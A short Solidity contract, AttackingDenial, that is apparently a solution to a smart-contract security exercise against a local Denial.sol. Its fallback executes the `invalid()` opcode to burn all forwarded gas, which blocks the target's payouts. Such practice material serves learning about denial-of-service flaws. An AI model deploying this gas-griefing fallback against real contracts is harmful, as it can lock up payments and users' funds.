// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

import "hardhat/console.sol";

contract AttackingDenial {
    address payable public contractAddress;
    string[] public arrayOfStuff;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    fallback() external payable {
        console.log("fallback");
       assembly {
           invalid()
       }
    }
}
